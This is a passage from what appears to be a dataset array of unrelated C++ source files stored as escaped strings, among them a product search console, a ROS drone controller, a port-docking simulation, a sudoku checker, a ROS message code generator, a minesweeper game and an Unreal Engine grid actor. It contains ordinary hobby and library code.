\"===============================\\n\";\n\tcout << \"\\t Search Products by code\\n\";\n\tcout << \"===============================\\n\\n\";\n\n\tif (current_p == 0) {\n\t\tsetColor(\"31\");\n\t\tcout << \"There isn't any product. \\n\";\n\t\tsetColor(\"37\");\n\t\tcout << \"Press any key to continue...\";\n\t\t_getch();\n\t\treturn;\n\t}\n\n\tsetColor(\"35\");\n\tcout << \"Please enter the product code: \";\n\tcin >> spc;\n\n\tbool found = false;\n\tfor (int i = 0; i < current_p; i++) {\n\t\tif (spc == product[i].codeProducts) {\n\t\t\tfound = true;\n\t\t\tsetColor(\"35\");\n\t\t\tcout << \"Successfully found\\n\\n\";\n\t\t\tsetColor(\"31\");\n\t\t\tcout << \"Name: \" << product[i].nameProducts << endl;\n\t\t\tcout << \"Code:\" << spc << endl;\n\t\t\tcout << \"Price: \" << product[i].price << endl;\n\t\t\tcout << \"Enventory: \" << product[i].inventory << endl;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (!found) {\n\t\tsetColor(\"31\");\n\t\tcout << \"The product not found. \\n\";\n\t}\n\n\tsetColor(\"37\");\n\tcout << \"Press any key to continue...\";\n\t_getch();\n\treturn;\n}\n// ________________ Searchps _______________ //\nvoid Searchps() {\n\tstring sps;\n\tstring temp;\n\tsystem(\"cls\");\n\tsetColor(\"32\");\n\tcout << \"===============================\\n\";\n\tcout << \"\\t Search Products by string\\n\";\n\tcout << \"===============================\\n\\n\";\n\n\tif (current_p == 0) {\n\t\tsetColor(\"31\");\n\t\tcout << \"There isn't any product. \\n\";\n\t\tsetColor(\"37\");\n\t\tcout << \"Press any key to continue...\";\n\t\t_getch();\n\t\treturn;\n\t}\n\n\tsetColor(\"35\");\n\tcout << \"Please enter the string: \";\n\tcin >> sps;\n\n\tbool found = false;\n\n\tfor (int n = 0; n < current_p; n++) {\n\t\ttemp = product[n].nameProducts;\n\n\t\tif (temp.find(sps) != string::npos) {\n\t\t\tsetColor(\"31\");\n\t\t\tcout << \"Product found: \" << temp << endl;\n\t\t\tcout << \"Code: \" << product[n].codeProducts << endl;\n\t\t\tcout << \"Price: \" << product[n].price << endl;\n\t\t\tcout << \"Inventory: \" << product[n].inventory << endl;\n\t\t\tfound = true;\n\t\t}\n\t}\n\n\tif (!found) {\n\t",
    "#include \"BFcontrol_FSM.h\"\n\nvoid BFcontrol_FSM::run(Topic_handler &th){\n    ros::Time now_time = ros::Time::now();\n    switch (state){\n        case MANUAL_CTRL:\n            pid.reset();\n            ROS_INFO(\"is_armed = %d\", th.rc.is_armed);\n            ROS_INFO(\"is_offboard = %d\", th.rc.is_offboard);\n            if(th.rc.is_offboard){\n            // if(th.rc.is_offboard && th.rc.is_armed && th.is_odom_received(now_time)){\n                pid.reset();\n                state = CMD_CTRL;\n                pid.desire_position = th.odom.position;\n                pid.desire_position[2] += 0.4;\n                pid.desire_yaw = th.odom.get_current_yaw();\n                ROS_INFO(\"Enter offboard mode!\");\n            }\n            break;\n        case CMD_CTRL:\n            if(!(th.rc.is_offboard)){\n            // if(!th.rc.is_offboard || !(th.is_odom_received(now_time))){\n                state = MANUAL_CTRL;\n                pid.reset();\n                ROS_INFO(\"Enter manual mode!\");\n            }\n            else{\n                pid.outer_position_loop(th);\n                pid.inner_velocity_loop(th);\n                th.mav_cmd_publisher.publish(pid.att_cmd_msg);\n                ROS_INFO(\"x cmd is %f\", pid.att_cmd_msg.body_rate.x);\n                ROS_INFO(\"y cmd is %f\", pid.att_cmd_msg.body_rate.y);\n                ROS_INFO(\"thrust cmd is %f\", pid.att_cmd_msg.thrust);\n                ROS_INFO(\"desire pos is %f\", pid.desire_position[2]);\n            }\n            break;\n    }\n\n}",
    "#include \"port_manager.hpp\"\n\n#include <algorithm>\n#include <condition_variable>\n#include <iostream>\n#include <thread>\n#include <vector>\n\nnamespace ecuafast {\n\nPortManager::PortManager(int port, int maxSlots, double damageProb,\n                         int unloadTime)\n    : port(port),\n      maxSlots(maxSlots),\n      damageProb(damageProb),\n      unloadTime(unloadTime),\n      shutdown(false) {\n  dockingSlots.resize(maxSlots, {false, nullptr, 0, 0});\n\n  // Initialize worker threads\n  for (int i = 0; i < maxSlots; ++i) {\n    workerThreads.emplace_back([this]() { processQueue(); });\n  }\n}\n\nvoid PortManager::start() {\n  int serverSocket = SocketWrapper::createServerSocket(port);\n\n  while (!shutdown) {\n    sockaddr_in clientAddr{};\n    socklen_t clientLen = sizeof(clientAddr);\n    int clientSocket =\n        accept(serverSocket, (struct sockaddr*)&clientAddr, &clientLen);\n\n    if (clientSocket >= 0) {\n      std::thread([this, clientSocket]() {\n        this->handleClient(clientSocket);\n      }).detach();\n    }\n  }\n\n  // Cleanup\n  for (auto& thread : workerThreads) {\n    thread.join();\n  }\n}\n\nbool PortManager::requestDocking(int clientSocket, const ShipInfo& ship) {\n  std::lock_guard<std::mutex> lock(slotsMutex);\n\n  // std::cout << \"Received docking request for \" << ship.id << \"\\n\";\n\n  // Just check if any slot is available\n  auto availableSlot =\n      std::find_if(dockingSlots.begin(), dockingSlots.end(),\n                   [](const PortSlot& slot) { return !slot.occupied; });\n\n  return availableSlot != dockingSlots.end();\n}\n\nvoid PortManager::doInspection(const ShipInfo& ship) {\n  std::cout << \"Ship \" << ship.id << \" starting inspection\\n\";\n\n  std::lock_guard<std::mutex> lock(slotsMutex);\n\n  // Find first empty slot\n  auto emptySlot =\n      std::find_if(dockingSlots.begin(), dockingSlots.end(),\n                   [](const PortSlot& slot) { return !slot.occupied; });\n\n  if (emptySlot != dockingSlots.end()) {\n    // Only mark as occupied and set the ship info\n    emptySlot->occupied = true;\n    emptySlot->ship = new ShipInfo(ship);\n    emptySlot->arrivalTime = std::time(nullptr);\n    emptySlot->departureTime = 0;  // Will be set by processQueue\n  }\n\n  // Notify one worker that new work is available\n  slotsCV.notify_one();\n}\n\nvoid PortManager::processQueue() {\n  while (!shutdown) {\n    ShipInfo* shipToProcess = nullptr;\n    std::list<PortSlot>::iterator slotToProcess;\n\n    // Wait for work\n    {\n      std::unique_lock<std::mutex> lock(slotsMutex);\n      slotsCV.wait(lock, [this]() {\n        return shutdown || std::any_of(dockingSlots.begin(), dockingSlots.end(),\n                                       [](const PortSlot& slot) {\n                                         return slot.occupied &&\n                                                slot.ship != nullptr &&\n                                                slot.departureTime == 0;\n                                       });\n      });\n\n      if (shutdown) {\n        return;\n      }\n\n      // First look for priority ships that haven't been processed\n      auto it = std::find_if(\n          dockingSlots.begin(), dockingSlots.end(), [](const PortSlot& slot) {\n            return slot.occupied && slot.ship != nullptr &&\n                   slot.departureTime == 0 &&  // Not yet processed\n                   slot.ship->needsInspection &&\n                   slot.ship->destination != \"Ecuador\";\n          });\n\n      // If no priority ships, get first unprocessed ship\n      if (it == dockingSlots.end()) {\n        it = std::find_if(\n            dockingSlots.begin(), dockingSlots.end(), [](const PortSlot& slot) {\n              return slot.occupied && slot.ship != nullptr &&\n                     slot.departureTime == 0;  // Not yet processed\n            });\n      }\n\n      if (it != dockingSlots.end()) {\n        slotToProcess = it;\n        shipToProcess = it->ship;\n\n        // Calculate processing time\n        int processTime = unloadTime;\n        if (shipToProcess->destination != \"Ecuador\") {\n          processTime /= 2;\n        }\n        if (shipToProcess->needsInspection) {\n          processTime *= 2;\n        }\n\n        // Set departure time to mark as being processed\n        it->departureTime = it->arrivalTime + processTime;\n      }\n    }\n\n    if (shipToProcess) {\n      int processTime =\n          slotToProcess->departureTime - slotToProcess->arrivalTime;\n\n      std::cout << \"Ship \" << shipToProcess->id << \" starting unload process (\"\n                << processTime << \" seconds)\\n\";\n\n      // Simulate processing time\n      std::this_thread::sleep_for(std::chrono::seconds(processTime));\n\n      std::cout << \"Ship \" << shipToProcess->id << \" finished unloading\\n\";\n\n      // Release the slot\n      releaseSlot(shipToProcess->id);\n    }\n  }\n}\n\nvoid PortManager::releaseSlot(int shipId) {\n  std::lock_guard<std::mutex> lock(slotsMutex);\n\n  auto it = std::find_if(\n      dockingSlots.begin(), dockingSlots.end(), [shipId](const PortSlot& slot) {\n        return slot.occupied && slot.ship != nul",
    "// bai14_luy thua.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\nint main()\n{\n    cout << \"tinh luy thua\\n\";\n    int so, somu, luythua = 1;\n    cout << \" nhap so: \"; cin >> so;\n    cout << \" nhap so mu: \"; cin >> somu;\n\n    for (int i = 1; i <= somu; i++)\n    {\n        luythua = luythua * so;\n    }\n    cout << \"luy thua: \" << luythua;\n}\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include <cstdio>\n\nusing namespace std;\n\nint sudokuChecker(int board[9][9]) {\n    // Check rows and columns\n    for (int i = 0; i < 9; i++) {\n        int rowCheck[10] = {0}; // Index 0 is unused\n        int colCheck[10] = {0};\n\n        for (int j = 0; j < 9; j++) {\n            // Check row\n            if (board[i][j] != 0) {\n                if (rowCheck[board[i][j]] == 1) {\n                    return 0;\n                }\n                rowCheck[board[i][j]]++;\n            }\n\n            // Check column\n            if (board[j][i] != 0) {\n                if (colCheck[board[j][i]] == 1) {\n                    return 0;\n                }\n                colCheck[board[j][i]]++;\n            }\n        }\n    }\n\n    // Check 3x3 subgrids\n    for (int row = 0; row < 9; row += 3) {\n        for (int col = 0; col < 9; col += 3) {\n            int boxCheck[10] = {0}; // Index 0 is unused\n\n            for (int i = row; i < row + 3; i++) {\n                for (int j = col; j < col + 3; j++) {\n                    if (board[i][j] != 0) {\n                        if (boxCheck[board[i][j]] == 1) {\n                            return 0;\n                        }\n                        boxCheck[board[i][j]]++;\n                    }\n                }\n            }\n        }\n    }\n\n    return 1;\n}\n\n// Main function\nint main() {\n    // Initialize the Sudoku\n    int sudoku[9][9] = {\n        {9, 6, 4, 0, 0, 7, 8, 0, 0},    // Row 1\n        {0, 0, 8, 0, 0, 5, 6, 0, 0},    // Row 2\n        {0, 0, 0, 0, 0, 0, 7, 9, 2},    // Row 3\n        {0, 0, 0, 4, 2, 6, 0, 0, 7},    // Row 4\n        {0, 4, 5, 8, 0, 9, 0, 3, 0},    // Row 5\n        {0, 0, 0, 7, 5, 0, 0, 0, 0},    // Row 6\n        {0, 9, 0, 0, 6, 0, 1, 0, 0},    // Row 7\n        {0, 8, 3, 0, 7, 0, 0, 0, 4},    // Row 8\n        {5, 0, 0, 0, 4, 1, 3, 0, 0}     // Row 9\n    };\n\n    if (sudokuChecker(sudoku) == 1) {\n        printf(\"Sudoku solution\\n\");\n    } else {\n        printf(\"No solution\\n\");\n    }\n}\n",
    "#include <fmt/core.h>\n#include <fmt/format.h>\n#include <algorithm>\n#include <cstdint>\n#include <fstream>\n#include <limits>\n#include <regex>\n#include <rosidlcpp_generator_c/rosidlcpp_generator_c.hpp>\n\n#include <cstdlib>\n#include <exception>\n#include <format>\n#include <iostream>\n#include <ostream>\n#include <stdexcept>\n#include <string>\n#include <string_view>\n#include <tuple>\n#include <utility>\n#include <vector>\n\n#include <argparse/argparse.hpp>\n#include <inja/inja.hpp>\n\n#include <nlohmann/json_fwd.hpp>\n\n#include <rosidlcpp_generator_core/generator_base.hpp>\n#include <rosidlcpp_parser/rosidlcpp_parser.hpp>\n\nstd::string idl_structure_type_to_c_include_prefix(const nlohmann::json& type, const std::string& subdirectory = \"\") {\n  std::vector<std::string> parts;\n  for (const auto& part : type[\"namespaces\"]) {\n    parts.push_back(rosidlcpp_core::camel_to_snake(part.get<std::string>()));\n  }\n  std::string include_prefix = fmt::format(\"{}/{}\", fmt::join(parts, \"/\"), subdirectory + \"/\" + rosidlcpp_core::camel_to_snake(type[\"name\"]));\n\n  // Strip service or action suffixes\n  if (include_prefix.ends_with(\"__request\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 9);\n  } else if (include_prefix.ends_with(\"__response\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 10);\n  } else if (include_prefix.ends_with(\"__goal\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 6);\n  } else if (include_prefix.ends_with(\"__result\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 8);\n  } else if (include_prefix.ends_with(\"__feedback\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 10);\n  } else if (include_prefix.ends_with(\"__send_goal\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 11);\n  } else if (include_prefix.ends_with(\"__get_result\")) {\n    include_prefix = include_prefix.substr(0, include_prefix.size() - 12);\n  }\n  return include_prefix;\n}\n\nstd::string idl_structure_type_to_c_typename(const nlohmann::json& type) {\n  return fmt::format(\"{}__{}\", fmt::join(type[\"namespaces\"], \"__\"), type[\"name\"].get<std::string>());\n}\n\nstd::string idl_structure_type_sequence_to_c_typename(const nlohmann::json& type) {\n  return idl_structure_type_to_c_typename(type) + \"__Sequence\";\n}\n\nnlohmann::json get_includes(rosidlcpp_core::CallbackArgs& args) {\n  const auto& message = *args.at(0);\n  const std::string suffix = *args.at(1);\n  nlohmann::json includes_json = nlohmann::json::array();\n\n  const std::string runtime_c_suffix = suffix != \"__struct.h\" ? std::string{std::string_view{suffix}.substr(1)} : \".h\";\n\n  // TODO: Use a custom map sorted by insertion order\n  std::vector<std::pair<std::string, std::vector<std::string>>> header_to_members;\n  auto append_header_to_members = [](std::vector<std::pair<std::string, std::vector<std::string>>>& header_to_members, const std::string& header, const std::string& member) {\n    auto it = std::find_if(header_to_members.begin(), header_to_members.end(), [header](const auto& v) { return v.first == header; });\n    if (it == header_to_members.end()) {\n      it = header_to_members.insert(it, {header, {}});\n    }\n    it->second.push_back(member);\n  };\n\n  for (const auto& member : message[\"members\"]) {\n    if (rosidlcpp_core::is_sequence(member[\"type\"])) {\n      if (rosidlcpp_core::is_primitive(member[\"type\"][\"value_type\"])) {\n        append_header_to_members(header_to_members, \"rosidl_runtime_c/primitives_sequence\" + runtime_c_suffix, member[\"name\"]);\n        continue;\n      }\n    }\n\n    auto type = member[\"type\"];\n    if (rosidlcpp_core::is_nestedtype(type)) {\n      type = type[\"value_type\"];\n    }\n\n    if (type[\"name\"] == \"string\") {\n      append_header_to_members(header_to_members, \"rosidl_runtime_c/string\" + runtime_c_suffix, member[\"name\"]);\n    } else if (type[\"name\"] == \"wstring\") {\n      append_header_to_members(header_to_members, \"rosidl_runtime_c/u16string\" + runtime_c_suffix, member[\"name\"]);\n    } else if (rosidlcpp_core::is_namespaced(type)) {\n      if ((message[\"type\"][\"namespaces\"].back() == \"action\" ||\n           message[\"type\"][\"namespaces\"].back() == \"srv\") &&\n          (type[\"name\"].get<std::string>().ends_with(rosidlcpp_core::SERVICE_REQUEST_MESSAGE_SUFFIX) ||\n           type[\"name\"].get<std::string>().ends_with(rosidlcpp_core::SERVICE_RESPONSE_MESSAGE_SUFFIX) ||\n           type[\"name\"].get<std::string>().ends_with(rosidlcpp_core::SERVICE_EVENT_MESSAGE_SUFFIX))) {\n        auto type_name = type[\"name\"].get<std::string>().substr(0, type[\"name\"].get<std::string>().find('_'));\n        if (suffix == \"__struct.h\" && type_name == message[\"type\"][\"name\"].get<std::string>().substr(0, message[\"type\"][\"name\"].get<std::string>().find('_'))) {\n          continue;\n        }\n        type[\"name\"] = type_name;\n      }\n      auto include_prefix = idl_structure_type_to_c_include_prefix(type, \"detail\");\n      append_header_to_members(header_to_members, include_prefix +",
    "#include \"pch.h\"\n#include \"BookManager.h\"\n\nBookManager::BookManager()\n{\n}\n\nBookManager::~BookManager()\n{\n}\n\nvoid BookManager::addBook(const string& title, const string& author)\n{\n    cout << \"\uc774\ubbf8 \ub4f1\ub85d\ub41c \ucc45\uc774 \uc788\ub294\uc9c0 \ud0d0\uc0c9\uc911...\" << endl;\n    if (searchByTitle(title) != nullptr)\n    {\n        cout << \"\uc774\ubbf8 \ub4f1\ub85d\ub41c \ucc45\uc774 \uc874\uc7ac\ud569\ub2c8\ub2e4.\" << endl;\n    }\n    else\n    {\n        books.push_back(Book(title, author)); // push_back \uc0ac\uc6a9\n        cout << \"\ucc45\uc774 \ucd94\uac00\ub418\uc5c8\uc2b5\ub2c8\ub2e4: \" << title << \" by \" << author << endl;\n    }   \n}\n\nvoid BookManager::displayAllBooks() const\n{\n    if (books.empty()) {\n        cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n        return;\n    }\n\n    cout << \"\ud604\uc7ac \ub3c4\uc11c \ubaa9\ub85d:\" << endl;\n    for (size_t i = 0; i < books.size(); i++) { // \uc77c\ubc18\uc801\uc778 for\ubb38 \uc0ac\uc6a9\n        cout << \"- \" << books[i].GetTitle() << \" by \" << books[i].GetAuthor() << endl;\n    }\n}\n\nconst Book* BookManager::searchByTitle(string title)\n{\n    for (int i = 0; i < books.size(); ++i)\n    {\n        if (title == books[i].GetTitle())\n        {\n            cout << \"\uac80\uc0c9\ub41c \ub3c4\uc11c\" << endl;\n            cout << \"- \" << books[i].GetTitle() << \" by \" << books[i].GetAuthor() << endl;\n\n            return &books[i];\n        }\n    }\n\n    cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n    return nullptr;\n}\n\nvoid BookManager::searchByAuthor(string author)\n{\n    bool is_serach = false;\n    bool is_once = false;\n    for (int i = 0; i < books.size(); ++i)\n    {\n        if (author == books[i].GetAuthor())\n        {\n            if (!is_once)\n            {\n                cout << \"\uac80\uc0c9\ub41c \ub3c4\uc11c\" << endl;\n                is_once = true;\n            }\n            cout << \"- \" << books[i].GetTitle() << \" by \" << books[i].GetAuthor() << endl;\n\n            is_serach = true;\n        }\n    }\n\n    if (!is_serach)\n        cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n    return;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"new_postalcode_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (c) 2013, Willow Garage, Inc.\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above copyright\n *       notice, this list of conditions and the following disclaimer in the\n *       documentation and/or other materials provided with the distribution.\n *     * Neither the name of the Willow Garage, Inc. nor the names of its\n *       contributors may be used to endorse or promote products derived from\n *       this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <nav2_costmap_2d/costmap_math.hpp>\n\n#include <vector>\n\ndouble distanceToLine(double pX, double pY, double x0, double y0, double x1, double y1)\n{\n  double A = pX - x0;\n  double B = pY - y0;\n  double C = x1 - x0;\n  double D = y1 - y0;\n\n  double dot = A * C + B * D;\n  double len_sq = C * C + D * D;\n  double param = dot / len_sq;\n\n  double xx, yy;\n\n  if (param < 0) {\n    xx = x0;\n    yy = y0;\n  } else if (param > 1) {\n    xx = x1;\n    yy = y1;\n  } else {\n    xx = x0 + param * C;\n    yy = y0 + param * D;\n  }\n\n  return distance(pX, pY, xx, yy);\n}\n",
    "#include <iostream>\n#include <windows.h> // setlocale \u00e9s console t\u00f6rl\u00e9s miatt\n#include <conio.h> // Billenyt\u0171zet bek\u00e9r\u00e9sek miatt\n#include <ctime> // Random miatt\n\nint diff; unsigned int selectedDiff = 1; unsigned int globalBombCount = 25; // Lejjebb kell glob\u00e1lisan\nvoid info(); int difficulty(); void controls(); void credits(); int main();\n\nvoid vissza() {\n    std::cout << \" 5..\"; Sleep(1000);\n    std::cout << \" 4..\"; Sleep(1000);\n    std::cout << \" 3..\"; Sleep(1000);\n    std::cout << \" 2..\"; Sleep(1000);\n    std::cout << \" 1..\"; Sleep(1000);\n    std::cout << \" 0..\"; system(\"cls\");\n}\n\nclass Map {\nprivate:\n    int width, height;\n    int playerX, playerY;\n\n    class Field {\n    public:\n        bool playerHere, flagged, bomb, seen;\n        unsigned int value;\n\n        Field() : playerHere(false), flagged(false), bomb(false), seen(false), value(0) {}\n\n        void here() { playerHere = true; }\n        void notHere() { playerHere = false; }\n        void flagHere() { flagged = !flagged; } // Megford\u00edtja az aktu\u00e1list\n        void bombHere() { bomb = true; }\n        void seenHere() { seen = true; }\n\n        void displayField() {\n            if (playerHere) {\n                std::cout << \"P \"; // Aktu\u00e1lis poz\u00edci\u00f3 jelz\u0151\n            }\n            else if (seen) {\n                if (bomb) std::cout << \"* \"; // Felfedezett bomba\n                else {\n                    if (value == 0) std::cout << \"  \"; // Mez\u0151 k\u00f6r\u00fcli bomb\u00e1k sz\u00e1ma\n                    else { std::cout << value << \" \"; }\n                }\n            }\n            else if (flagged) {\n                std::cout << \"F \"; // Megjel\u00f6lt mez\u0151\n            }\n            else {\n                std::cout << \"X \"; // \"\u00c9rintetlen\" mez\u0151\n            }\n        }\n    };\n\n    Field** field;\n\n    void placeBombs(int bombCount) { // Bomb\u00e1k v\u00e9letlenszer\u0171 elhelyez\u00e9se\n        srand(time(0));\n        for (int i = 0; i < bombCount; i++) {\n            int x, y;\n            do {\n                x = rand() % width;\n                y = rand() % height;\n            } while (field[y][x].bomb);\n            field[y][x].bombHere();\n        }\n    }\n\n    void calculateAround() { // Mez\u0151 k\u00f6r\u00fcli bomb\u00e1k kisz\u00e1m\u00edt\u00e1sa\n        for (int y = 0; y < height; y++) {\n            for (int x = 0; x < width; x++) {\n                if (field[y][x].bomb) continue;\n                int count = 0;\n                for (int dy = -1; dy <= 1; dy++) {\n                    for (int dx = -1; dx <= 1; dx++) {\n                        int nx = x + dx;\n                        int ny = y + dy;\n                        if (isValidField(nx, ny) && field[ny][nx].bomb) {\n                            count++;\n                        }\n                    }\n                }\n                field[y][x].value = count;\n            }\n        }\n    }\n\n    void revealEmptyFields(int x, int y) { // Null\u00e1k \u00e9s a a k\u00f6r\u00fcl\u00f6tte l\u00e9v\u0151k megmutat\u00e1sa\n        if (!isValidField(x, y) || field[y][x].bomb) return;\n\n        field[y][x].seenHere();\n\n        if (field[y][x].value == 0) {\n            for (int dy = -1; dy <= 1; dy++) {\n                for (int dx = -1; dx <= 1; dx++) {\n                    int nx = x + dx;\n                    int ny = y + dy;\n                    if (isValidField(nx, ny) && !field[ny][nx].seen) {\n                        revealEmptyFields(nx, ny);\n                    }\n                }\n            }\n        }\n    }\n\n    bool checkWin() {\n        for (int y = 0; y < height; y++) {\n            for (int x = 0; x < width; x++) {\n                if (!field[y][x].bomb && !field[y][x].seen) {\n                    return false;\n                }\n            }\n        }\n        return true;\n    }\n\npublic:\n    Map(int w, int h, int bombs) : width(w), height(h), playerX(w / 2), playerY(h / 2) {\n        field = new Field * [height];\n        for (int i = 0; i < height; i++) {\n            field[i] = new Field[width];\n        }\n        placeBombs(bombs);\n        calculateAround();\n    }\n\n    ~Map() {\n        for (int i = 0; i < height; i++) {\n            delete[] field[i];\n        }\n        delete[] field;\n    }\n\n    void display() { // T\u00e1bla megjelen\u00edt\u00e9se\n        system(\"cls\"); // Windows specifikus konzol t\u00f6rl\u00e9s \n        for (int y = 0; y < height; y++) {\n            for (int x = 0; x < width; x++) {\n                if (x == playerX && y == playerY) {\n                    field[y][x].here();\n                    field[y][x].displayField();\n                }\n                else {\n                    field[y][x].notHere();\n                    field[y][x].displayField();\n                }\n            }\n            std::cout << std::endl;\n        }\n    }\n\n    bool isValidField(int x, int y) {\n        return x >= 0 && x < width && y >= 0 && y < height;\n    }\n\n    void movePlayer(int dx, int dy) { // Mozg\u00e1s\n        int newX = playerX + dx;\n        int newY = playerY + dy;\n        if (isValidField(newX, newY)) {\n            playerX = newX;\n            playerY = newY;\n            display();\n        }\n    }\n\n    void enterKey() { // Megn\u00e9z\n     ",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"GameGrid.h\"\n#include \"Components/ChildActorComponent.h\"\n\nAGameGrid* AGameGrid::GameGrid = nullptr;\n// Sets default values\nAGameGrid::AGameGrid() :\n\tNumRows(8),\n\tNumCols(8)\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n\tRootComponent = CreateDefaultSubobject<USceneComponent>(\"Root\");\n\n\tGameGrid = this;\n}\n\nAGameSlot* AGameGrid::GetSlot(FSGridPosition& Position) \n{\n\tint GridIndex = Position.Row * NumCols + Position.Col;\n\tif (GridActors.IsValidIndex(GridIndex))\n\t{\n\t\treturn Cast<AGameSlot>(GridActors[GridIndex]->GetChildActor());\n\t}\n\treturn nullptr;\n}\nAGameSlot* AGameGrid::FindSlot(FSGridPosition Position) \n{\n\tif (GameGrid)\n\t{\n\t\treturn GameGrid -> GetSlot(Position);\n\t}\n\treturn nullptr;\n}\n\n\nvoid AGameGrid::OnConstruction(const FTransform& Transform)\n{\n\tSuper::OnConstruction(Transform);\n\n\tfor (auto Grid : GridActors)\n\t{\n\t\tGrid->DestroyComponent();\n\t}\n\n\tGridActors.Empty();\n\n\tif (!GridClass->IsValidLowLevel())return;\n\t\n\tAGameSlot* Slot = GridClass->GetDefaultObject<AGameSlot>();\n\n\tif (Slot == nullptr) return;\n\n\tFVector Extends = Slot->Box->GetScaledBoxExtent() * 2;\n\n\tfor (int i = 0; i < NumRows; i++)\n\t{\n\t\tfor (int j = 0; j < NumCols; j++)\n\t\t{\n\t\t\tFName GridName(FString::Printf(TEXT(\"Slot%dx%d\"), j, i));\n\t\t\tauto Grid = NewObject<UChildActorComponent>(this, UChildActorComponent::StaticClass(), GridName);\n\t\t\tGrid->RegisterComponent();\n\t\t\tGrid->AttachToComponent(RootComponent, FAttachmentTransformRules::KeepRelativeTransform);\n\t\t\tGrid->SetRelativeLocation(FVector((NumRows - i - 1) * Extends.X - (NumRows * 0.5f - 0.5f) * Extends.X, j * Extends.Y - (NumCols * 0.5f - 0.5f) * Extends.Y, 0));\n\n\t\t\tGridActors.Add(Grid);\n\n\t\t\tGrid->SetChildActorClass(GridClass);\n\t\t\tAGameSlot* GameSlot = Cast<AGameSlot>(Grid->GetChildActor());\n\n\t\t\tGameSlot->SetActorLabel(GridName.ToString());\n\t\t\tGameSlot->GridPosition.Col = j;\n\t\t\tGameSlot->GridPosition.Row = i;\n\t\t}\n\t}\n}\n\n// Called when the game starts or when spawned\nvoid AGameGrid::BeginPlay()\n{\n\tSuper::BeginPlay();\n\t\n}\n\n// Called every frame\nvoid AGameGrid::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n}\n\n",
